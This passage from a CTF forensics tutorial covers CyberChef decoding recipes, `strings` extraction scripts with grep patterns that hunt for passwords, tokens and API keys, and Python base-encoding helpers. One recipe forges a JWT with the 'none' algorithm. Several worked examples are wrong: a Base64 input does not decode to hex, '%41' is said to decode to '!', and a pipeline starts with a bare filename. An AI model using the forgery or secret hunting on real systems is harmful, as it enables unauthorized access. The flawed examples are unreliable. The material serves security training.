Example input: SGVsbG8lMjBXb3JsZA==
→ Base64 decode → Hex decode → ROT13 → URL decode → flag
```

**Recipe 2: XOR Analysis**

```
Operation chain:
1. From Hex
2. XOR Brute Force
   - Key length: 1
   - Sample length: 100
   - Print key: true

Automatically tries all single-byte XOR keys
```

**Recipe 3: Image Metadata**

```
Operation chain:
1. From Base64 (if encoded)
2. Extract EXIF
3. Strings (to find hidden text)

Reveals image metadata and embedded strings
```

**Recipe 4: JWT Analysis**

```
Operation chain:
1. JWT Decode
2. JSON Beautify

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Reveals header, payload, and signature components
```

**Recipe 5: Hash Identification**

```
Operation chain:
1. Analyze hash
2. From Hex (if needed)

Identifies hash type from length/format:
- 32 chars = MD5
- 40 chars = SHA1
- 64 chars = SHA256
```

**Recipe 6: Zip File Analysis**

```
Operation chain:
1. From Hex (if hex-encoded)
2. Unzip
3. Parse file headers
4. Strings

Extract and analyze ZIP contents
```

**Advanced Techniques**:

**Nested Decoding Chain**:

```
Real CTF example: data encoded multiple times

Recipe:
1. URL Decode
2. From Base64
3. Gunzip
4. From Hex
5. XOR (key: "CTF")
6. From Base64
7. ROT13

Each operation feeds into the next automatically
```

**Conditional Processing (Magic Operation)**:

```
Magic operation automatically:
- Detects encoding
- Applies appropriate decoder
- Chains multiple decodings

Usage:
1. Paste unknown encoded data
2. Add "Magic" operation
3. Set intensive mode for deeper analysis

Very useful when encoding scheme is unknown
```

**Custom XOR Key Finding**:

```
When you know plaintext fragment:

Recipe:
1. From Hex (ciphertext)
2. XOR
   - Input: Known plaintext (hex)
   - Operation: XOR
3. Result shows key

Then use discovered key to decrypt full message
```

**File Carving from Hex Dump**:

```
Recipe:
1. From Hex Dump
   - Parse hex dump format
2. Parse file signatures
3. Extract files

Useful for memory dumps and hex-encoded files
```

**Practical CTF Workflows**:

**Workflow 1: Unknown Encoding**

```
Step 1: Use "Magic" operation
  - Set depth: 3-5
  - Enable intensive mode
  
Step 2: If Magic fails, try common patterns:
  - From Base64
  - From Hex
  - URL Decode
  - ROT13
  
Step 3: Look at output for clues:
  - Readable text = success
  - More gibberish = wrong path or multi-layer
```

**Workflow 2: Image Steganography**

```
Recipe for image analysis:
1. Remove EXIF (to see if data changes)
2. Extract LSB (Least Significant Bit)
   - Red: 1 bit
   - Green: 1 bit  
   - Blue: 1 bit
3. From Binary
4. Magic operation

Tests for LSB steganography
```

**Workflow 3: Network Packet Analysis**

```
Recipe:
1. From Hex Dump (packet capture hex)
2. Parse IPv4 header
3. Parse TCP header (if applicable)
4. Extract HTTP payload
5. URL Decode
6. From Base64 (if encoded)
```

**Workflow 4: Binary Protocol Analysis**

```
Recipe:
1. From Hex
2. To Hex (with formatting)
   - Delimiter: Space
   - Bytes per line: 16
3. Strings
4. Entropy (to find encrypted sections)
```

**Script Integration (Headless)**:

```bash
# CyberChef has a Node.js API for automation

# Install
npm install --save cyberchef

# JavaScript example
const chef = require("cyberchef");

// Simple operation
const output = chef.bake("SGVsbG8gV29ybGQ=", [
    {op: "From Base64", args: []}
]);
console.log(output.toString());

# Python wrapper (unofficial)
pip3 install pycyberchef

python3 << 'EOF'
from pycyberchef import CyberChef

# Create instance
cyber = CyberChef()

# Apply recipe
result = cyber.bake(
    input_data="5468697320697320612074657374",
    recipe=[
        {"op": "From Hex", "args": []},
        {"op": "ROT13", "args": [True, True, 13]}
    ]
)

print(result)
EOF
```

**Custom Operation Chains**:

```javascript
// Save and reuse recipes
const recipe = [
    {op: "From Base64", args: []},
    {op: "From Hex", args: ["Auto"]},
    {op: "XOR", args: [{string: "key", option: "UTF8"}, "Standard", false]},
    {op: "ROT13", args: [true, true, 13]}
];

// Export recipe as JSON
// CyberChef UI: Save recipe button → Copy JSON
```

**Useful Operation Combinations**:

**Finding XOR Key with Known Plaintext**:

```
Given: Encrypted data and known plaintext start

Recipe:
1. Load encrypted data (hex)
2. "XOR" operation with known plaintext
3. "To Hex" to see key pattern
4. If repeating pattern found = key length
5. Use discovered key on full ciphertext

Example:
Ciphertext: 1c0e070a1b1c0a
Known plaintext starts with: "flag"
XOR: shows repeating pattern = key
```

**Multi-Stage Compression**:

```
Recipe for deeply compressed data:
1. Unzip
2. Gunzip  
3. Bzip2 Decompress
4. Raw Inflate
5. Magic (to catch any additional encoding)

Handles nested compression common in CTFs
```

**Unicode and Character Set Issues**:

```
Recipe for encoding problems:
1. Encode text (UTF-8)
2. Decode text (ISO-8859-1)
3. Or: "Transcode" operation
   - From: Windows-1252
   - To: UTF-8
```

**Binary to Text Conversions**:

```
Recipe:
1. From Binary (8-bit chunks)
2. From Hex (if result is hex)
3. URL Decode (if result looks URL-encoded)
4. From Base64 (if result is base64)

Chains common text-encoding schemes
```

**Regular Expression Operations**:

```
"Find / Replace" operation with regex:

Example 1: Extract all hex values
Find: ([0-9a-fA-F]{2})
Replace: Leave empty, use "List matches"

Example 2: Extract email addresses  
Find: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}

Example 3: Clean hex dump
Find: ^[0-9a-f]+:\s+
Replace: (empty)
```

**Data Format Transformations**:

```
JSON to CSV:
1. JSON Parse
2. JPath expression (extract specific fields)
3. To CSV

CSV to JSON:
1. From CSV
2. To JSON

XML to JSON:
1. XML Parse
2. To JSON
```

**Entropy and Randomness Analysis**:

```
Recipe for identifying encrypted sections:
1. Entropy (sliding window)
   - Window size: 256
2. Result shows entropy graph
   - High entropy (>7.5) = encrypted/compressed
   - Low entropy (<5.0) = plaintext/structured
```

**Hash Cracking Integration**:

```
While CyberChef doesn't crack hashes directly:

Recipe for hash analysis:
1. Analyze hash (identifies type)
2. Generate hash (verify matches)
3. Compare with dictionary
   - Use "From CSV" to load wordlist
   - Use "Filter" to match hash
```

**Image Manipulation**:

```
Operations:
- Resize Image
- Rotate Image  
- Blur Image
- Render Image
- Extract LSB (steganography)
- View Bit Plane

Recipe for LSB extraction:
1. Load image (drag & drop)
2. Extract LSB
   - Red: 1 bit
   - Green: 1 bit
   - Blue: 1 bit
3. From Binary
4. Magic (auto-detect encoding)
```

**Network Protocol Parsing**:

```
Recipe for HTTP request analysis:
1. From Hex Dump (if in hex)
2. Parse HTTP request
3. URL Decode (query parameters)
4. From Base64 (if data is encoded)

Recipe for TCP stream:
1. From Hex
2. Parse TCP
3. Extract payload
4. Gunzip (if compressed HTTP)
```

**Certificate and Key Analysis**:

```
Recipe for X.509 certificates:
1. PEM to Hex
2. Parse X.509 certificate
3. Extract fields (subject, issuer, validity)

Recipe for RSA keys:
1. Parse PEM
2. Parse ASN.1
3. Extract modulus, exponents
```

**Baking Multiple Inputs**:

```
CyberChef "Fork" operation:

Recipe for batch processing:
1. Input: Multiple lines of data
2. Fork (split by newline)
3. From Base64 (applied to each)
4. Merge (combine results)

Processes each line independently through recipe
```

**Real-World CTF Examples** [Inference]:

```
Example 1: Multi-layer obfuscation
Input: JTQxJTQxJTQxJTQx...

Recipe:
1. URL Decode → !!!! (repeated)
2. From Base64 → hex string
3. From Hex → binary data
4. XOR Brute Force → finds key=0x42
5. Result: flag{...}

Example 2: Image with embedded ZIP
Input: PNG file upload

Recipe:
1. Extract Files (detects appended ZIP)
2. Unzip
3. From Base64 (if contents encoded)
4. Magic (final decode)

Example 3: JWT token manipulation
Input: JWT token

Recipe:
1. JWT Decode (view payload)
2. JWT Sign (with "none" algorithm)
   - Exploit algorithm confusion
3. Output: Modified token
```

**Keyboard Shortcuts**:

```
Ctrl+Enter    - Bake (execute recipe)
Ctrl+Shift+B  - Auto-bake toggle
Ctrl+S        - Save recipe
Ctrl+O        - Load recipe
Ctrl+Z        - Undo
Ctrl+Shift+Z  - Redo
Drag & Drop   - Add operation to recipe
```

**Tips and Tricks**:

```
1. Auto Bake: Enable for real-time results as you build recipe

2. Breakpoints: Click operation to set breakpoint
   - See intermediate results
   - Debug multi-stage recipes

3. Comments: Right-click operation → Add comment
   - Document complex recipes

4. Disable operations: Toggle operations on/off
   - Test recipe variations

5. Save recipes: Bookmark or export JSON
   - Build personal library of common patterns

6. Input/Output formats:
   - Text (default)
   - Hex
   - Base64
   - File (drag & drop)

7. Flow control:
   - Jump (conditional branching)
   - Label (jump targets)
   - Register (store intermediate values)
```

**Common Pitfalls**:

```
1. Character encoding issues
   - Use "Encode text" or "Decode text" to fix

2. Hex format variations
   - "From Hex" has multiple format options
   - Try "Auto" or specific delimiter

3. Compression before encryption
   - Order matters: decompress before decrypt

4. Binary data display
   - Use "To Hex" or "To Base64" for visibility

5. Large file handling
   - Browser memory limits (~100MB)
   - Use desktop/CLI version for larger files
```

**Integration with Other Tools**:

```bash
# Export CyberChef output to file
# 1. Bake recipe
# 2. Click "Save output to file"
# 3. Process with other tools

# Example pipeline
cyberchef_output.bin | xxd | grep "flag"
cat cyberchef_output.txt | strings | grep -E "CTF{.*}"

# Automate with headless CyberChef
node cyberchef_script.js < input.dat > output.txt
```

**Performance Considerations**:

```
For large files:
- Disable auto-bake
- Use "Load file" instead of paste
- Process in chunks if possible
- Consider CLI version for automation

Optimal operations order:
1. Decompress first (reduces data size)
2. Decode (hex, base64)
3. Decrypt
4. Parse/analyze
```

### strings (embedded data)

`strings` extracts printable character sequences from binary files, revealing embedded text, URLs, passwords, commands, and other human-readable data hidden in executables, images, or memory dumps. Essential for quick reconnaissance and finding flags in CTF challenges.

**Basic Usage**:

```bash
# Extract all printable strings (default: 4+ chars)
strings file.bin

# Set minimum string length
strings -n 8 file.bin
# Only strings 8+ characters

strings -n 3 file.bin
# Include very short strings (3+ chars)

# Show file offset of each string
strings -t d file.bin
# -t d: Decimal offset
# -t x: Hexadecimal offset
# -t o: Octal offset

# Scan entire file (including data sections)
strings -a file.bin
# Default only scans loaded sections of executables
```

**Encoding Options**:

```bash
# Default: 7-bit ASCII (s encoding)
strings -e s file.bin

# 8-bit characters (Latin-1)
strings -e S file.bin

# 16-bit little-endian (Unicode)
strings -e l file.bin

# 16-bit big-endian
strings -e b file.bin

# 32-bit little-endian
strings -e L file.bin

# 32-bit big-endian
strings -e B file.bin

# All encodings
strings -e s -e S -e l -e b file.bin
```

**CTF-Focused Techniques**:

```bash
# Find flags with common patterns
strings file.bin | grep -E "(flag|FLAG|CTF){.*}"
strings file.bin | grep -iE "flag{[^}]+}"
strings file.bin | grep -E "[A-Za-z0-9+/]{20,}={0,2}"  # Base64

# Find URLs and IPs
strings file.bin | grep -E "https?://"
strings file.bin | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"

# Find credentials
strings file.bin | grep -iE "(password|passwd|pwd|user|admin)"
strings file.bin | grep -iE "(api[_-]?key|token|secret)"

# Find email addresses
strings file.bin | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

# Find file paths
strings file.bin | grep -E "^(/|C:\\|\\\\)"
strings file.bin | grep -E "\.(txt|conf|key|pem|log)$"
```

**Advanced Filtering**:

```bash
# Only unique strings
strings file.bin | sort -u

# Sort by length
strings file.bin | awk '{print length, $0}' | sort -rn | head -20

# Only alphabetic strings (no numbers/symbols)
strings file.bin | grep -E "^[A-Za-z]+$"

# Only strings with high entropy (potential encoded data)
strings file.bin | while read line; do
    entropy=$(echo "$line" | python3 -c "
import sys, math
from collections import Counter
s = sys.stdin.read().strip()
freq = Counter(s)
ent = -sum((c/len(s)) * math.log2(c/len(s)) for c in freq.values())
print(f'{ent:.2f}')
")
    if (( $(echo "$entropy > 4" | bc -l) )); then
        echo "$line (entropy: $entropy)"
    fi
done

# Strings with specific character sets
strings file.bin | grep -E "^[0-9a-fA-F]+$"  # Hex strings
strings file.bin | grep -E "^[A-Za-z0-9+/=]+$"  # Base64 candidates
```

**Targeted Extraction**:

```bash
# Extract from specific file offset
strings -t x file.bin | awk '$1 >= "0x1000" && $1 <= "0x2000"'

# Extract from ELF sections
readelf -p .rodata executable | grep flag
readelf -p .data executable

# Extract from PE sections
strings -e l executable.exe | grep -i "flag"  # Unicode strings common in Windows

# Extract from memory dumps
strings memory.dmp | grep -E "password|secret" | sort -u

# Extract from images (steganography check)
strings image.jpg | tail -n 50  # Check end of file
strings image.png | grep -E "^[A-Za-z0-9+/]{40,}={0,2}$"  # Possible base64
```

**Combined with Other Tools**:

```bash
# strings + binwalk
binwalk -e file.bin
strings _file.bin.extracted/* | grep flag

# strings + xxd (with offsets)
strings -t x file.bin | while read offset string; do
    echo "Offset: $offset - String: $string"
    xxd -s $offset -l 64 file.bin
done

# strings + file identification
for f in *; do
    echo "=== $f ==="
    file $f
    strings $f | head -n 10
    echo
done

# strings + grep + context
strings -n 6 file.bin | grep -B 2 -A 2 "flag"

# strings with hex output
strings -t x file.bin | awk '{print $1}' | while read offset; do
    xxd -s $offset -l 32 file.bin
done
```

**Scripted Analysis**:

```bash
#!/bin/bash
# comprehensive_strings.sh - Advanced string extraction

FILE="$1"
OUTPUT_DIR="${FILE}_strings_analysis"

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[*] Extracting ASCII strings..."
strings -n 4 "../$FILE" > ascii_4.txt
strings -n 8 "../$FILE" > ascii_8.txt
strings -n 16 "../$FILE" > ascii_16.txt

echo "[*] Extracting Unicode strings..."
strings -e l "../$FILE" > unicode_le.txt
strings -e b "../$FILE" > unicode_be.txt

echo "[*] Finding potential flags..."
grep -iE "(flag|ctf){" ascii_*.txt unicode_*.txt > potential_flags.txt

echo "[*] Finding URLs..."
grep -hE "https?://" *.txt | sort -u > urls.txt

echo "[*] Finding base64 candidates..."
grep -hE "^[A-Za-z0-9+/]{20,}={0,2}$" *.txt | sort -u > base64_candidates.txt

echo "[*] Finding credentials..."
grep -ihE "(password|passwd|api.?key|token)" *.txt > credentials.txt

echo "[*] Extracting high-entropy strings..."
cat ascii_8.txt | while read line; do
    entropy=$(echo "$line" | python3 -c "
import sys, math
from collections import Counter
s = sys.stdin.read().strip()
if len(s) < 8: sys.exit(0)
freq = Counter(s)
ent = -sum((c/len(s)) * math.log2(c/len(s)) for c in freq.values())
if ent > 4.5:
    print(s)
")
    [ -n "$entropy" ] && echo "$entropy" >> high_entropy.txt
done

echo "[*] Analysis complete. Results in: $OUTPUT_DIR"
ls -lh
```

**Python Integration**:

```python
#!/usr/bin/env python3
"""
Advanced string extraction and analysis
"""

import re
import string
from collections import Counter
import math

def extract_strings(filename, min_length=4, encodings=['ascii', 'utf-16-le']):
    """
    Extract strings from binary file with multiple encodings
    """
    results = []
    
    with open(filename, 'rb') as f:
        data = f.read()
    
    for encoding in encodings:
        try:
            if encoding == 'ascii':
                # Manual ASCII extraction (printable chars)
                current = b''
                for byte in data:
                    if 32 <= byte <= 126:  # Printable ASCII range
                        current += bytes([byte])
                    else:
                        if len(current) >= min_length:
                            results.append(current.decode('ascii'))
                        current = b''
            else:
                # Try other encodings
                decoded = data.decode(encoding, errors='ignore')
                # Extract printable sequences
                for match in re.finditer(r'[\x20-\x7E]{%d,}' % min_length, decoded):
                    results.append(match.group())
        except:
            continue
    
    return list(set(results))  # Remove duplicates

def calculate_entropy(s):
    """Calculate Shannon entropy of string"""
    if not s:
        return 0
    
    freq = Counter(s)
    entropy = -sum((count/len(s)) * math.log2(count/len(s)) 
                   for count in freq.values())
    return entropy

def find_interesting_strings(filename):
    """
    Find potentially interesting strings
    """
    strings_list = extract_strings(filename, min_length=4)
    
    interesting = {
        'flags': [],
        'urls': [],
        'emails': [],
        'credentials': [],
        'base64': [],
        'high_entropy': []
    }
    
    for s in strings_list:
        # Flag patterns
        if re.search(r'(flag|ctf){', s, re.I):
            interesting['flags'].append(s)
        
        # URLs
        if re.match(r'https?://', s):
            interesting['urls'].append(s)
        
        # Emails
        if re.match(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', s):
            interesting['emails'].append(s)
        
        # Credential keywords
        if re.search(r'(password|passwd|secret|key|token)', s, re.I):
            interesting['credentials'].append(s)
        
        # Base64 candidates (length multiple of 4, valid charset)
        if len(s) >= 16 and len(s) % 4 == 0:
            if re.match(r'^[A-Za-z0-9+/]+=*$', s):
                interesting['base64'].append(s)
        
        # High entropy (potential encoded/encrypted)
        if len(s) >= 16:
            entropy = calculate_entropy(s)
            if entropy > 4.5:
                interesting['high_entropy'].append((s, entropy))
    
    return interesting

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 strings_analysis.py <file>")
        sys.exit(1)
    
    filename = sys.argv[1]
    results = find_interesting_strings(filename)
    
    for category, items in results.items():
        if items:
            print(f"\n[*] {category.upper()}:")
            for item in items[:10]:  # Show first 10
                if isinstance(item, tuple):
                    print(f"    {item[0]} (entropy: {item[1]:.2f})")
                else:
                    print(f"    {item}")
```

**Specific File Type Analysis**:

```bash
# ELF executables
strings -a executable | grep -E "(password|flag|key)"
readelf -p .rodata executable | strings

# Windows PE files
strings -e l executable.exe | grep -i "flag"
strings -e l executable.exe | grep -E "^[A-Z]:\\.*"

# PDF files
strings document.pdf | grep -E "^/.*$"  # PDF objects
strings document.pdf | grep -oE "https?://[^ ]+"

# Office documents (DOCX, XLSX - actually ZIP files)
unzip -p document.docx | strings | grep flag

# Memory dumps
strings -a memory.dmp | grep -E "password|secret" | sort -u
strings -e l memory.dmp | grep -i "user"  # Unicode for Windows

# Disk images
strings -n 8 disk.img | grep -E "flag{.*}"
strings -t d disk.img | grep "password"  # With offsets

# Network captures (PCAP)
strings capture.pcap | grep -oE "https?://[^ ]+"
strings capture.pcap | grep -E "(username|password|auth)"
```

**Pattern-Based Extraction**:

```bash
# Extract all hex strings (32+ chars)
strings file.bin | grep -oE "[0-9a-fA-F]{32,}"

# Extract all base64-like strings
strings file.bin | grep -E "^[A-Za-z0-9+/]{16,}={0,2}$" | while read b64; do
    echo "Trying: $b64"
    echo "$b64" | base64 -d 2>/dev/null
done

# Extract email-like patterns
strings file.bin | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

# Extract IPv4 addresses
strings file.bin | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"

# Extract function/variable names (programming patterns)
strings file.bin | grep -E "^[a-z_][a-z0-9_]*$" | head -20

# Extract potential encryption keys
strings -n 16 file.bin | grep -E "^[0-9a-fA-F]{32,}$"

# Extract SQL queries
strings file.bin | grep -iE "^(SELECT|INSERT|UPDATE|DELETE).*"
```

**Performance Optimization**:

```bash
# For large files, limit scope
strings -n 8 -t x large_file.bin | grep flag
# Longer strings + hex offsets reduces output

# Process in parallel for multiple files
find . -type f -name "*.bin" | parallel strings {} | grep flag

# Only scan specific sections
objdump -s -j .rodata executable | strings

# Stream processing for huge files
cat huge_file.bin | strings -n 8 | grep -E "flag|password"
```

**False Positive Reduction**:

```bash
# Filter out common false positives
strings file.bin | grep -vE "^[A-Z]{3,}$"  # Exclude all-caps
strings file.bin | grep -vE "^[@#$%^&*]{3,}"  # Exclude symbol strings
strings file.bin | grep -vE "^ +$"  # Exclude whitespace-only

# Only dictionary words (requires wordlist)
strings file.bin | grep -Fxf /usr/share/dict/words

# Statistical filtering (Python)
strings file.bin | python3 << 'EOF'
import sys
import string

for line in sys.stdin:
    line = line.strip()
    if len(line) < 8:
        continue
    
    # Calculate character diversity
    unique_chars = len(set(line))
    if unique_chars < 4:  # Too repetitive
        continue
    
    # Check if mostly alphanumeric
    alnum_count = sum(c.isalnum() for c in line)
    if alnum_count / len(line) < 0.8:
        continue
    
    print(line)
EOF
```

**Real-World CTF Examples** [Inference]:

```bash
# Example 1: Flag in ELF binary
strings challenge | grep -E "flag{.*}"
# Output: flag{h1dd3n_1n_b1n4ry}

# Example 2: Base64 in image
strings image.png | tail -n 5 | head -n 1 | base64 -d
# Reveals hidden message

# Example 3: URL in firmware
strings firmware.bin | grep "http" | sort -u
# Finds: http://admin:password@192.168.1.1/flag.txt

# Example 4: Unicode password in memory dump
strings -e l memory.dmp | grep -i "password" -A 2
# Finds: Password: CTF{...}

# Example 5: Hex-encoded key
strings binary | grep -oE "[0-9a-f]{64}" | head -n 1
# Extract 256-bit key in hex
```

**Integration Script**:

```bash
#!/bin/bash
# strings_ctf_helper.sh - Comprehensive CTF string extraction

FILE="$1"

if [ -z "$FILE" ] || [ ! -f "$FILE" ]; then
    echo "Usage: $0 <file>"
    exit 1
fi

echo "[*] File: $FILE"
file "$FILE"
echo

echo "[*] Quick flag check..."
strings "$FILE" | grep -iE "(flag|ctf){" && echo "[+] Possible flag found!" || echo "[-] No obvious flags"
echo

echo "[*] URLs found:"
strings "$FILE" | grep -oE "https?://[^ ]+" | sort -u
echo

echo "[*] Email addresses:"
strings "$FILE" | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u
echo

echo "[*] Potential credentials:"
strings "$FILE" | grep -iE "(password|passwd|user|admin)" | head -10
echo

echo "[*] Base64-like strings (trying to decode):"
strings "$FILE" | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | while read b64; do
    decoded=$(echo "$b64" | base64 -d 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$decoded" ]; then
        echo "  $b64 → $decoded"
    fi
done
echo

echo "[*] High-entropy strings (possible encryption):"
strings -n 16 "$FILE" | head -10
```

**Key Takeaways**:

1. **Default behavior**: 4+ printable ASCII characters
2. **Encoding matters**: Use `-e l` for Unicode/UTF-16 in Windows binaries
3. **Length filtering**: Adjust `-n` based on target (longer = less noise)
4. **Combine with grep**: Essential for finding specific patterns
5. **Check file ends**: `strings file | tail` often reveals appended data
6. **Offset tracking**: `-t x` helps locate strings in hex editors

---

# STEGANOGRAPHY & COVERT CHANNELS



---



---



---



---

# DIGITAL SIGNATURES & CERTIFICATES



---



---



---



---



---

# ENCODING & OBFUSCATION

## Encoding Schemes

### Base64 / Base32 / Base16

Base encodings convert binary data into ASCII-printable characters. These are encoding schemes, not encryption, and are trivially reversible.

**Base64 Encoding:**

```python
import base64

# Basic Base64 encoding/decoding
plaintext = b"Hello, World!"
encoded = base64.b64encode(plaintext)
decoded = base64.b64decode(encoded)

print(f"Original: {plaintext}")
print(f"Base64: {encoded}")
print(f"Decoded: {decoded}")

# Base64 characteristics
# - Uses: A-Z, a-z, 0-9, +, /
# - Padding: = or ==
# - 3 bytes → 4 characters (33% overhead)

# URL-safe Base64 (uses - and _ instead of + and /)
url_encoded = base64.urlsafe_b64encode(plaintext)
url_decoded = base64.urlsafe_b64decode(url_encoded)

print(f"URL-safe Base64: {url_encoded}")
```

**Base32 Encoding:**

```python
# Base32 encoding/decoding
plaintext = b"Hello, World!"
base32_encoded = base64.b32encode(plaintext)
base32_decoded = base64.b32decode(base32_encoded)

print(f"Base32: {base32_encoded}")
print(f"Decoded: {base32_decoded}")

# Base32 characteristics
# - Uses: A-Z, 2-7 (32 characters)
# - Case-insensitive
# - Padding: = characters
# - 5 bytes → 8 characters (60% overhead)

# Base32 variants
# Standard: RFC 4648 (A-Z, 2-7)
# Hex: 0-9, A-V
base32hex_encoded = base64.b32hexencode(plaintext)
print(f"Base32Hex: {base32hex_encoded}")
```

**Base16 (Hex) Encoding:**

```python
# Base16 encoding/decoding
plaintext = b"Hello, World!"
base16_encoded = base64.b16encode(plaintext)
base16_decoded = base64.b16decode(base16_encoded)

print(f"Base16: {base16_encoded}")
print(f"Decoded: {base16_decoded}")

# Base16 characteristics
# - Uses: 0-9, A-F
# - Case-insensitive
# - No padding
# - 1 byte → 2 characters (100% overhead)
```

**Automatic Base Detection:**

```python
import re
import base64

def detect_base_encoding(data):
    """
    Detect which base encoding is used
    [Inference] Based on character set and padding patterns
    """
    if isinstance(data, bytes):
        data = data.decode('ascii', errors='ignore')
    
    detections = []
    
    # Base64 detection
    base64_pattern = r'^[A-Za-z0-9+/]*={0,2}$'
    if re.match(base64_pattern, data) and len(data) % 4 == 0:
        detections.append({
            'encoding': 'Base64',
            'confidence': 'HIGH' if ('=' in data or '+' in data or '/' in data) else 'MEDIUM',
            'charset': 'A-Za-z0-9+/='
        })
    
    # URL-safe Base64
    urlsafe_pattern = r'^[A-Za-z0-9_-]*={0,2}$'
    if re.match(urlsafe_pattern, data) and len(data) % 4 == 0:
        if '_' in data or '-' in data:
            detections.append({
                'encoding': 'URL-safe Base64',
                'confidence': 'HIGH',
                'charset': 'A-Za-z0-9_-='
            })
    
    # Base32 detection
    base32_pattern = r'^[A-Z2-7]*={0,6}$'
    if re.match(base32_pattern, data.upper()) and len(data) % 8 == 0:
        detections.append({
            'encoding': 'Base32',
            'confidence': 'HIGH' if '=' in data else 'MEDIUM',
            'charset': 'A-Z2-7='
        })
    
    # Base16/Hex detection
    hex_pattern = r'^[0-9A-Fa-f]*$'
    if re.match(hex_pattern, data) and len(data) % 2 == 0:
        detections.append({
            'encoding': 'Base16/Hex',
            'confidence': 'HIGH' if len(data) > 4 else 'LOW',
            'charset': '0-9A-Fa-f'
        })
    
    return detections

# Test detection
test_strings = [
    "SGVsbG8sIFdvcmxkIQ==",          # Base64
    "JBSWY3DPEBLW64TMMQ======",      # Base32
    "48656c6c6f2c20576f726c6421",    # Hex
    "SGVsbG8sIFdvcmxkIQ",            # Base64 without padding
]

for test in test_strings:
    print(f"\nTesting: {test}")
    results = detect_base_encoding(test)
    for result in results:
        print(f"  {result['encoding']}: {result['confidence']} confidence")
```

**Multi-Layer Base Encoding:**

```python
def decode_recursive(encoded_data, max_depth=10):
    """
    Recursively decode multiple layers of base encoding
    Common in CTF challenges
    """
    if isinstance(encoded_data, bytes):
        encoded_data = encoded_data.decode('ascii', errors='ignore')
    
    current = encoded_data
    depth = 0
    decode_path = []
    
    while depth < max_depth:
        detections = detect_base_encoding(current)
        
        if not detections:
            break
        
        # Try each detected encoding
        decoded = None
        used_encoding = None
        
        for detection in sorted(detections, key=lambda x: x['confidence'], reverse=True):
            try:
                if detection['encoding'] == 'Base64':
                    decoded = base64.b64decode(current)
                    used_encoding = 'Base64'
                elif detection['encoding'] == 'URL-safe Base64':
                    decoded = base64.urlsafe_b64decode(current)
                    used_encoding = 'URL-safe Base64'
                elif detection['encoding'] == 'Base32':
                    decoded = base64.b32decode(current.upper())
                    used_encoding = 'Base32'
                elif detection['encoding'] == 'Base16/Hex':
                    decoded = bytes.fromhex(current)
                    used_encoding = 'Base16/Hex'
                
                if decoded:
                    # Check if result is printable ASCII
                    try:
                        decoded_str = decoded.decode('ascii')
                        if decoded_str != current:
                            decode_path.append(used_encoding)
                            current = decoded_str
                            depth += 1
                            break
                    except:
                        # Not ASCII, might be binary or another encoding
                        decode_path.append(used_encoding)
                        current = decoded
                        depth += 1
                        break
            except Exception as e:
                continue
        
        if not decoded or decoded == current.encode():
            break
    
    return {
        'final_result': current,
        'decode_path': decode_path,
        'layers': depth
    }

# Example: Multiple layers
original = b"FLAG{nested_encoding}"
layer1 = base64.b64encode(original)
layer2 = base64.b32encode(layer1)
layer3 = base64.b64encode(layer2)

print(f"Encoded (3 layers): {layer3}")

result = decode_recursive(layer3)
print(f"\nDecode path: {' -> '.join(result['decode_path'])}")
print(f"Layers decoded: {result['layers']}")
print(f"Final result: {result['final_result']}")
```

**Base85/Ascii85:**

```python
import base64

def base85_operations():
    """
    Base85 (Ascii85) encoding - more efficient than Base64
    """
    plaintext = b"Hello, World!"
    
    # Base85 encoding (a85)
    a85_encoded = base64.a85encode(plaintext)
    a85_decoded = base64.a85decode(a85_encoded)
    
    print(f"Original: {plaintext}")
    print(f"Ascii85: {a85_encoded}")
    print(f"Decoded: {a85_decoded}")
    
    # Base85 (b85) - RFC 1924 variant
    b85_encoded = base64.b85encode(plaintext)
    b85_decoded = base64.b85decode(b85_encoded)
    
    print(f"Base85: {b85_encoded}")
    
    # Characteristics:
    # - 4 bytes → 5 characters (25% overhead vs 33% for Base64)
    # - Uses: 0-9, A-Z, a-z, and other printable ASCII
    # - No padding required

base85_operations()
```

**CTF Base Encoding Tricks:**

```python
def ctf_base_tricks():
    """
    Common CTF tricks with base encodings
    """
    print("[Inference] CTF Base Encoding Tricks:\n")
    
    # 1. Incomplete padding
    print("1. Incomplete/Missing Padding:")
    incomplete = "SGVsbG8sIFdvcmxkIQ"  # Missing ==
    # Add padding manually
    padding_needed = (4 - len(incomplete) % 4) % 4
    complete = incomplete + '=' * padding_needed
    decoded = base64.b64decode(complete)
    print(f"   Fixed: {decoded}\n")
    
    # 2. Reversed base64
    print("2. Reversed Base64:")
    normal = base64.b64encode(b"SECRET")
    reversed_b64 = normal[::-1]
    print(f"   Reversed: {reversed_b64}")
    print(f"   Decode reversed: {base64.b64decode(reversed_b64[::-1])}\n")
    
    # 3. Custom alphabet
    print("3. Custom Base64 Alphabet:")
    print("   Standard: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
    print("   Custom:   May use different character set - need to substitute\n")
    
    # 4. Mixed encodings
    print("4. Mixed Character Encodings:")
    print("   Base64 → Hex → Base32 → Base64")
    print("   Use recursive decoder\n")
    
    # 5. Base64 in various contexts
    print("5. Context-Specific Base64:")
    print("   - JWT tokens (header.payload.signature)")
    print("   - Data URIs (data:image/png;base64,...)")
    print("   - HTTP Basic Auth (Authorization: Basic ...)")
    print("   - XML/JSON embedded data")

ctf_base_tricks()
```

### Hex Encoding

Hexadecimal encoding represents bytes as two-digit hex values (0-9, A-F).

**Basic Hex Operations:**

```python
def hex_operations():
    """
